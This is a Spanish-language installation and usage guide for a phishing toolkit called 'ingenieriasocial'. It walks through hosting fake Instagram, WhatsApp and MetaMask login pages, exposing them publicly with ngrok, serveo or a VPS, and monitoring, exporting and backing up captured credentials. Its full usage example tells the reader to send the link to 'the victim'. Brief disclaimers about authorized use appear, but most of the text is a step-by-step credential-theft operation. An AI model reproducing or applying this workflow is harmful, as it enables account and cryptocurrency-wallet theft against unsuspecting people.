# 🐉 Instalación en Kali Linux - ingenieriasocial

## Creado por: MidasOrion

Guía completa para instalar y usar **ingenieriasocial** en Kali Linux.

---

## 📋 Requisitos Previos

- Kali Linux (2023.1 o superior)
- Python 3.8+
- Git
- Acceso root

---

## 🚀 Instalación Rápida

### **Método 1: Instalación Automática (Recomendado)**

```bash
# Clonar el repositorio
git clone https://github.com/CoderFullPro/ingenieriasocial.git

# Entrar al directorio
cd ingenieriasocial

# Dar permisos de ejecución
chmod +x ingenieriasocial

# Ejecutar como root
sudo ./ingenieriasocial
```

---

## 📦 Instalación Manual Paso a Paso

### **1. Actualizar el sistema**

```bash
sudo apt update && sudo apt upgrade -y
```

### **2. Instalar dependencias**

```bash
# Dependencias básicas
sudo apt install -y python3 python3-pip git

# Dependencias de Python
sudo pip3 install pexpect pycrypto pyopenssl pefile impacket

# Dependencias opcionales (para funciones avanzadas)
sudo apt install -y apache2 php
```

### **3. Clonar el repositorio**

```bash
cd /opt
sudo git clone https://github.com/CoderFullPro/ingenieriasocial.git
cd ingenieriasocial
```

### **4. Dar permisos**

```bash
sudo chmod +x ingenieriasocial
sudo chmod +x start_dashboard_simple.sh
sudo chmod +x subir_a_github.sh
```

### **5. Ejecutar**

```bash
sudo ./ingenieriasocial
```

---

## 🎯 Uso Básico

### **Iniciar ingenieriasocial:**

```bash
cd /opt/ingenieriasocial
sudo ./ingenieriasocial
```

### **Iniciar Dashboard:**

```bash
cd /opt/ingenieriasocial
./start_dashboard_simple.sh
```

Luego abre tu navegador en: **http://localhost:8000/dashboard_simple.html**

---

## 🌐 Configurar Templates de Phishing

### **1. Usar con Apache (Recomendado para producción)**

```bash
# Copiar templates a Apache
sudo cp -r src/templates/phishing/* /var/www/html/

# Reiniciar Apache
sudo systemctl restart apache2

# Verificar que Apache está corriendo
sudo systemctl status apache2
```

Ahora tus templates estarán disponibles en:
- **Instagram:** http://tu-ip/instagram/
- **WhatsApp:** http://tu-ip/whatsapp/
- **MetaMask:** http://tu-ip/metamask/

### **2. Usar con servidor PHP integrado (Para pruebas)**

```bash
# Ir al directorio del template
cd src/templates/phishing/instagram

# Iniciar servidor PHP
php -S 0.0.0.0:8080

# Acceder desde: http://tu-ip:8080
```

---

## 🔧 Configuración de Red

### **Obtener tu IP local:**

```bash
ip addr show | grep inet
# o
ifconfig
```

### **Configurar para red local:**

```bash
# Permitir tráfico en el firewall
sudo ufw allow 80/tcp
sudo ufw allow 8080/tcp
sudo ufw allow 8000/tcp
```

### **Acceder desde otros dispositivos:**

Desde cualquier dispositivo en tu red local:
- **Templates:** http://TU-IP-LOCAL/instagram/
- **Dashboard:** http://TU-IP-LOCAL:8000/dashboard_simple.html

---

## 🌍 Configuración para Internet (Avanzado)

### **Opción 1: Usar Ngrok**

```bash
# Instalar Ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

# Autenticar (registrarse en ngrok.com)
ngrok config add-authtoken TU_TOKEN

# Exponer Apache
ngrok http 80

# Exponer Dashboard
ngrok http 8000
```

### **Opción 2: Usar Serveo**

```bash
# Exponer puerto 80
ssh -R 80:localhost:80 serveo.net

# Te dará una URL pública como: https://random.serveo.net
```

### **Opción 3: VPS/Servidor Propio**

```bash
# En tu VPS, instalar Apache
sudo apt install apache2 php

# Copiar archivos
scp -r src/templates/phishing/* user@tu-vps:/var/www/html/

# Configurar dominio (opcional)
# Editar /etc/apache2/sites-available/000-default.conf
```

---

## 📊 Ver Capturas en Tiempo Real

### **Método 1: Dashboard Web**

```bash
./start_dashboard_simple.sh
```

### **Método 2: Ver archivos directamente**

```bash
# Ver capturas de Instagram
cat src/templates/phishing/instagram/captured_credentials.txt

# Ver en formato JSON
cat src/templates/phishing/instagram/captured_credentials.json | jq

# Monitorear en tiempo real
watch -n 2 'cat src/templates/phishing/instagram/captured_credentials.txt | tail -20'
```

### **Método 3: Usar tail -f**

```bash
# Monitorear capturas en tiempo real
tail -f src/templates/phishing/instagram/captured_credentials.txt
```

---

## 🔐 Configuración SSL/HTTPS (Opcional)

### **Usar Certbot para SSL gratuito:**

```bash
# Instalar Certbot
sudo apt install certbot python3-certbot-apache

# Obtener certificado (necesitas un dominio)
sudo certbot --apache -d tu-dominio.com

# Renovar automáticamente
sudo certbot renew --dry-run
```

---

## 🛠️ Troubleshooting

### **Error: Permission denied**

```bash
sudo chmod +x ingenieriasocial
sudo ./ingenieriasocial
```

### **Error: Module not found**

```bash
sudo pip3 install -r requirements.txt
# o instalar manualmente:
sudo pip3 install pexpect pycrypto pyopenssl
```

### **Error: Apache no inicia**

```bash
# Ver logs
sudo tail -f /var/log/apache2/error.log

# Verificar configuración
sudo apache2ctl configtest

# Reiniciar
sudo systemctl restart apache2
```

### **Error: Puerto en uso**

```bash
# Ver qué está usando el puerto
sudo lsof -i :80
sudo lsof -i :8080

# Matar proceso
sudo kill -9 PID
```

### **Dashboard no muestra capturas**

```bash
# Verificar que existen archivos JSON
ls -la src/templates/phishing/*/captured_credentials.json

# Verificar permisos
sudo chmod 644 src/templates/phishing/*/captured_credentials.json

# Crear archivos vacíos si no existen
echo "[]" > src/templates/phishing/instagram/captured_credentials.json
```

---

## 🎨 Personalización

### **Cambiar puerto del Dashboard:**

Editar `start_dashboard_simple.sh`:
```bash
python3 -m http.server 8000  # Cambiar 8000 por el puerto deseado
```

### **Agregar más templates:**

```bash
# Crear directorio
mkdir -p src/templates/phishing/nueva_plataforma

# Copiar estructura de otro template
cp src/templates/phishing/instagram/* src/templates/phishing/nueva_plataforma/

# Editar index.html y post.php según necesites
```

---

## 🔄 Actualizar ingenieriasocial

### **Método 1: Script Automático (Recomendado)**

```bash
cd /opt/ingenieriasocial
./upgrade.sh
```

El script automáticamente:
- ✅ Hace backup de tus capturas
- ✅ Descarga la última versión
- ✅ Muestra los cambios
- ✅ Actualiza dependencias
- ✅ Restaura tus capturas
- ✅ Configura permisos

### **Método 2: Manual**

```bash
cd /opt/ingenieriasocial

# Guardar capturas
cp -r src/templates/phishing/*/captured_credentials.* ~/backup/

# Actualizar
git pull origin master

# Restaurar capturas
cp ~/backup/captured_credentials.* src/templates/phishing/*/

# Actualizar permisos
chmod +x ingenieriasocial
```

---

## 📱 Acceso desde Móvil

### **En la misma red WiFi:**

1. Obtén tu IP local: `ip addr show`
2. En el móvil, abre el navegador
3. Ve a: `http://TU-IP:8000/dashboard_simple.html`

### **Desde Internet (con Ngrok):**

1. Inicia Ngrok: `ngrok http 8000`
2. Copia la URL pública (ej: https://abc123.ngrok.io)
3. Abre esa URL en cualquier dispositivo

---

## 🚨 Seguridad y Ética

### **⚠️ IMPORTANTE:**

- ✅ Solo usar en entornos autorizados
- ✅ Pruebas de penetración con permiso
- ✅ Educación y concienciación
- ❌ NO usar para actividades ilegales
- ❌ NO atacar sistemas sin autorización

### **Proteger tu instalación:**

```bash
# Cambiar permisos
sudo chmod 700 /opt/ingenieriasocial

# Solo root puede ejecutar
sudo chown root:root /opt/ingenieriasocial -R

# Firewall
sudo ufw enable
sudo ufw allow from 192.168.1.0/24 to any port 80
```

---

## 📚 Comandos Útiles

### **Ver estadísticas:**

```bash
# Contar capturas totales
find src/templates/phishing -name "captured_credentials.json" -exec cat {} \; | jq '. | length'

# Ver última captura
tail -1 src/templates/phishing/instagram/captured_credentials.txt

# Exportar todo a CSV
cat src/templates/phishing/*/captured_credentials.json | jq -r '.[] | [.platform, .username, .ip, .timestamp] | @csv' > capturas.csv
```

### **Limpiar capturas:**

```bash
# Limpiar todas las capturas
find src/templates/phishing -name "captured_credentials.*" -delete

# Crear archivos vacíos
for dir in src/templates/phishing/*/; do
    echo "[]" > "${dir}captured_credentials.json"
    touch "${dir}captured_credentials.txt"
done
```

### **Backup:**

```bash
# Backup de capturas
tar -czf capturas_backup_$(date +%Y%m%d).tar.gz src/templates/phishing/*/captured_credentials.*

# Restaurar backup
tar -xzf capturas_backup_20250120.tar.gz
```

---

## 🎓 Recursos Adicionales

### **Documentación:**
- README principal: `/opt/ingenieriasocial/README.md`
- Templates: `/opt/ingenieriasocial/src/templates/phishing/README.md`
- Dashboard: `/opt/ingenieriasocial/src/dashboard/README.md`

### **Soporte:**
- GitHub: https://github.com/CoderFullPro/ingenieriasocial
- Issues: https://github.com/CoderFullPro/ingenieriasocial/issues

---

## 🎯 Ejemplo Completo de Uso

```bash
# 1. Instalar
cd /opt
sudo git clone https://github.com/CoderFullPro/ingenieriasocial.git
cd ingenieriasocial
sudo chmod +x ingenieriasocial

# 2. Copiar templates a Apache
sudo cp -r src/templates/phishing/* /var/www/html/
sudo systemctl restart apache2

# 3. Obtener IP
ip addr show | grep "inet " | grep -v 127.0.0.1

# 4. Iniciar Dashboard
./start_dashboard_simple.sh

# 5. Compartir link de phishing
# Envía a la víctima: http://TU-IP/instagram/

# 6. Ver capturas en tiempo real
# Dashboard: http://TU-IP:8000/dashboard_simple.html
# o
tail -f /var/www/html/instagram/captured_credentials.txt
```

---

## ✅ Checklist de Instalación

- [ ] Kali Linux actualizado
- [ ] Python 3.8+ instalado
- [ ] Dependencias instaladas
- [ ] Repositorio clonado
- [ ] Permisos configurados
- [ ] Apache instalado y corriendo
- [ ] Templates copiados a /var/www/html/
- [ ] Dashboard funcionando
- [ ] Firewall configurado
- [ ] IP local obtenida
- [ ] Prueba exitosa desde otro dispositivo

---

**© 2025 ingenieriasocial - MidasOrion**

*Recuerda: Usa esta herramienta de forma ética y responsable.*
